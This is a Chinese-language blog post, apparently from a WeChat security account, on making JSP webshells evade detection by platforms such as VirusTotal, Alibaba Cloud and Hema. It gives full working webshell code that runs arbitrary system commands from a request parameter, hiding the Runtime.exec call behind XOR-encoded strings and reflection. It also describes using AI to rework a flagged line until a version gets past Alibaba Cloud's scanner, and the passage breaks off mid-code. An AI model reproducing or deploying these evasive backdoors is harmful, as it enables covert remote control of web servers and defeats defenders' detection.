---
title: WebShell免杀之jsp篇
url: https://mp.weixin.qq.com/s/SP_rfTqPagFVo3IVqgJ10Q
source: Doonsec's feed
date: 2026-03-03
fetch_date: 2026-03-04T04:01:32.544735
---

# WebShell免杀之jsp篇

![cover_image](https://mmbiz.qpic.cn/mmbiz_jpg/dscLuiaicVquPx0Q7ykdmcC3tQpbZzJk8mypslInRgWibBe0TMknRmiaiaPwibXSCoJzUrcIbR852MibmDPoeLbGGz3ibiaS3j6Qqv8biaBD1OnSJJzn4/0?wx_fmt=jpeg)

# WebShell免杀之jsp篇

原创

奋斗的小浪
奋斗的小浪

船山信安

![]()

在小说阅读器中沉浸阅读

## 查杀平台

### 1. 在线查杀平台（浏览器直接使用）

#### 河马在线查杀（https://n.shellpub.com/）

* 查杀方向：聚焦 WebShell 全类型文件（PHP、JSP、ASP、ASPX 等），采用 “特征检测 + 云端行为分析” 双引擎，重点识别国内主流隐藏后门、变形后门和免杀后门。
* 适配平台：纯在线网页版，支持单文件上传（限大小）和代码片段粘贴检测，无需安装客户端。

#### 微步在线云沙箱（https://s.threatbook.com/）

* 查杀方向：不仅查杀 WebShell，还覆盖恶意文件、恶意 URL、IP 威胁分析，通过沙箱模拟运行环境，深度检测未知后门的动态行为（如反弹连接、文件篡改）。
* 适配平台：在线网页版，支持多格式文件上传、URL 提交，兼容所有系统的浏览器。

#### VirusTotal（https://www.virustotal.com/）

* 查杀方向：全球多引擎聚合检测，整合近 70 款主流安全厂商引擎（如卡巴斯基、火绒、趋势等），覆盖 WebShell、病毒、木马、蠕虫等全类型恶意文件，适合交叉验证检测结果。
* 适配平台：在线网页版，支持文件、URL、IP、域名多维度检测，无系统限制。

#### 阿里云 WebShell 检测（https://ti.aliyun.com/#/webshell）

* 查杀方向：面向阿里云用户的 WebShell 专项检测，结合阿里云威胁情报库，重点识别部署在阿里云服务器上的后门文件，支持批量检测和溯源分析。
* 适配平台：在线网页版，需阿里云账号登录，兼容所有浏览器。

### 2. 本地客户端工具（需安装到服务器 / 电脑）

#### D 盾\_Web 查杀

* 查杀方向：主打服务器本地深度查杀，除 WebShell 外，还能检测恶意脚本、暗链、权限篡改痕迹，支持自定义规则扫描，对隐藏在系统目录中的后门识别能力强。
* 适配平台：仅支持 Windows 系统（服务器 / 个人电脑），无 Linux 版本。

#### 牧云（CloudWalker）

* 查杀方向：开源命令行工具，专注 WebShell 静态特征检测，通过内置规则库识别 PHP、JSP 等脚本中的恶意代码，适合开发者本地快速排查或服务器批量扫描。
* 适配平台：仅支持 Linux 系统，Windows 暂不支持，需通过命令行操作。

### 3. 企业级 / 专项检测工具

#### 长亭百川

* 查杀方向：企业级 Web 安全检测工具，除 WebShell 查杀外，还整合漏洞扫描、代码审计功能，重点检测企业网站的后门、逻辑漏洞和配置风险，支持定制化检测策略。
* 适配平台：支持 Windows、Linux 服务器端部署，提供客户端和 Web 管理界面。

#### WebDir+（百度）

* 查杀方向：采用动态监测技术（OpenRASP 内核），无需依赖特征库，通过实时监控 Web 应用的执行行为，识别零日 WebShell 和变形后门，误报率低。
* 适配平台：支持在线网页版（文件上传检测）和服务器端部署（企业版），兼容 Windows、Linux 服务器。

本次免杀测试主要针对`河马在线查杀（https://n.shellpub.com/）`和`阿里云 WebShell 检测（https://ti.aliyun.com/#/webshell）`

## 免杀工具

https://github.com/xiaogang000/XG\_NTAI

下载运行起来后， 做一个jsp免杀， 发生根本无法躲避上面两个平台的查杀

![image-20251101153232092.png](https://mmbiz.qpic.cn/sz_mmbiz_png/dscLuiaicVquP3IibzLxwcSLC3Y2V6Lv2noljQFQxaIhbWAB1gDzmZL1iccDOY2hpZic45SCNalibRlHJGODBLfYJDDOJ2vVrfkyPicLZj0tvA948k/640?wx_fmt=png&from=appmsg)

![image-20251101153249999.png](https://mmbiz.qpic.cn/mmbiz_png/dscLuiaicVquNgluBpxmTJuxHibLiaWhqtpzaaBA5N1u4bqYPzyVqzFrQtoibvOEls4d5ibR5Gu8BDcGIBSKpdqqCwvFzmrHudVw0JIc1UWEfPm1c/640?wx_fmt=png&from=appmsg)

可以绕过简单的查杀， 但对专业的查杀效果不大， 仁者见仁，智者见智。

## 免杀方式

目前webshell检测方式还是以检测特征为主，像JSP木马中常见的Runtime、ProcessBuilder、readObject、invoke、defineClass、ClassLoader等，基本上杀软直接就给杀掉了。从这里可以看出，JSP木马主要就是以反射、类加载器、反序列化这几个特征为主。

### 1、加密混淆

XOR AES BASE64 字符反转等

### 2、利用注释

```
/**/等关键字，如Runtime/**/.getRuntime()/**/.exec
```

### 3、改变特征

常见代码中变量或字符关键字修改

### 4、反射机制

利用反射获取类进行调用

### 5、字节码加载

BCEL ClassLoader等

### 6、远程分离加载

URL远程加载Class文件调用类方法

然而在实际的环境中， 单一的手法对于免杀很大可能不起效果了， 大多时候都是多种手法的结合

## 实操免杀

### 实操一：利用反射&异或加密实现WebShell免杀

参考文章：https://mp.weixin.qq.com/s/vTEReWXH2ZpNakD\_zBsUkw

#### 核心思想：异或加密

**异或运算**有一个非常独特的性质：对于一个值`A`和密钥`K`，满足`(A ^ K) ^ K = A`。

* **加密**：`密文 = 明文 ^ 密钥`
* **解密**：`明文 = 密文 ^ 密钥`

在WebShell的语境中：

* **明文**：我们想要执行的恶意Java代码字符串（例如`Runtime.getRuntime().exec("whoami")`）。
* **密文**：我们将明文用密钥加密后得到的一串乱码字符。
* **密钥**：一个我们自己选择的字符或数字。

WebShell的工作流程是：在JSP页面中，先定义好**密文**和**密钥**，然后在运行时通过异或运算**解密**出原始代码，最后利用反射机制（如`java.lang.reflect.Method`）来**执行**解密后的代码。由于静态文件中存放的是密文，它看起来是一堆无意义的字符，从而避免了基于特征码的检测。

加解密代码

```
<%!
    public static String xorEncryptDecrypt(String text, char key) {
        StringBuilder result = new StringBuilder();
        for (int i = 0; i < text.length(); i++) {
            char c = (char) (text.charAt(i) ^ key);  // 执行异或运算
            result.append(c);  // 将结果添加到 StringBuilder
        }
        return result.toString();
    }
%>
```

使用示例

```
<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<%!
    public static String xorEncryptDecrypt(String text, char key) {
        StringBuilder result = new StringBuilder();
        for (int i = 0; i < text.length(); i++) {
            char c = (char) (text.charAt(i) ^ key);  // 执行异或运算
            result.append(c);  // 将结果添加到 StringBuilder
        }
        return result.toString();
    }
%>
<%
    String string= "zifeiyu";
    char key = 'A';
    String encodeString = xorEncryptDecrypt(string,key);
    String decodeString= xorEncryptDecrypt(encodeString,key);
    System.out.println(encodeString);
    System.out.println(decodeString);
%>
```

输出：

> ;('$(84
> zifeiyu

了解大致使用原理就可以就一个免杀了， 结合反射

首先对`java.lang.Runtime.getRuntime().exec()`获取异或加密后的字符串， 设置密钥`A`.

```
public static String xorEncryptDecrypt(String text, char key) {
            StringBuilder result = new StringBuilder();
            for (int i = 0; i < text.length(); i++) {
                char c = (char) (text.charAt(i) ^ key);  // 执行异或运算
                result.append(c);  // 将结果添加到 StringBuilder
            }
            return result.toString();
    }
    public static void main(String[] args) {
        String a = "java.lang.Runtime";
        String b = "getRuntime";
        String c = "exec";
        char k = 'A';
        String d = xorEncryptDecrypt(a, k);
        String e = xorEncryptDecrypt(b, k);
        String f = xorEncryptDecrypt(c, k);
        System.out.println(d);
        System.out.println(e);
        System.out.println(f);
    }
```

```
+ 7 o- /&o4/5(,$
&$54/5(,$
$9$"
```

#### VT免杀代码

```
<%--
  Created by IntelliJ IDEA.
  User: 14109
  Date: 2025/11/1
  Time: 22:13
  To change this template use File | Settings | File Templates.
--%>
<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<%@ page import="java.lang.reflect.Method" %>
<%!
    public static String xorEncryptDecrypt(String text, char key) {
        StringBuilder result = new StringBuilder();
        for (int i = 0; i < text.length(); i++) {
            char c = (char) (text.charAt(i) ^ key);  // 执行异或运算
            result.append(c);  // 将结果添加到 StringBuilder
        }
        return result.toString();
    }
%>

<%
    String test = request.getParameter("test");
    if (test != null) {
        // 利用反射构造类名和方法名
        String a = "+ 7 o- /&o\u00134/5(,$";
        String d = "&$5\u00134/5(,$";
        String h = "$9$\"";
        char k = 'A';
        String aa = xorEncryptDecrypt(a,k);
        String bb = xorEncryptDecrypt(d,k);
        String cc = xorEncryptDecrypt(h,k);
        out.println(aa);
        out.println(bb);
        out.println(cc);
        Class<?> r = Class.forName(aa);
        Method g = r.getDeclaredMethod(bb);
        Method e = r.getDeclaredMethod(cc, String.class);

        Runtime runtime = (Runtime) g.invoke(null);
        Process process = (Process) e.invoke(runtime, test);

        java.io.InputStream in = process.getInputStream();
        int z = -1;
        byte[] b = new byte[2048];
        out.print("<pre>");
        while ((z = in.read(b)) != -1) {
            out.println(new String(b));
        }
        out.print("</pre>");
    }

%>
```

访问：http://localhost:8080/JspWebShell\_war\_exploded/xor.jsp?test=ipconfig

成功返回结果， 上传`VirusTotal`查杀是没有问题的。 但是河马和阿里云就不行了

VT
![image-20251102162610715.png](https://mmbiz.qpic.cn/mmbiz_png/dscLuiaicVquMdTROtRoD8ukU1T6VbBicfFCc24yEUjeclIRsftVaIf9SDgBn9AYJibHHFyWEia6zfWzzZAFvjibLwf82eLAbos3iaEeR6laic2YbtM/640?wx_fmt=png&from=appmsg)

阿里云：

![image-20251102162640767.png](https://mmbiz.qpic.cn/mmbiz_png/dscLuiaicVquNO0R7pjicT1ARZ1qLicyNS4lgA2csiar4U26Rure9ibBUxCOc7zhnHNqicTRtVAujXQnwe3PeqZcOyeevwpiaCupx539tib15jD1St6M/640?wx_fmt=png&from=appmsg)

河马：
![image-20251102162701812.png](https://mmbiz.qpic.cn/mmbiz_jpg/dscLuiaicVquN6ia3K0JqXrUkckRyK5picD7mogHB0HYv6smufGFx4Deqho4YW11iavvPxwg7WCv8diaKhY8XynPPics8yWhvtuq2htj8yq98ItOu8/640?wx_fmt=jpeg&from=appmsg)

接下来针对阿里云， 结合AI继续免杀， 因为阿里云查杀结果可以看出是什么代码被特征识别的

#### AI免杀

针对`Process process = (Process) e.invoke(runtime, test);`这一行的免杀替换方案：

多次尝试后总算有一个可以绕过

#### 阿里云免杀完整代码

```
<%@ page import="java.lang.reflect.Constructor" %>
<%@ page import="java.util.Arrays" %>
<%@ page import="java.util.Scanner" %>
<%!
    public static String xorEncryptDecrypt(String text, char key) {
        StringBuilder result = new StringBuilder();
        for (in...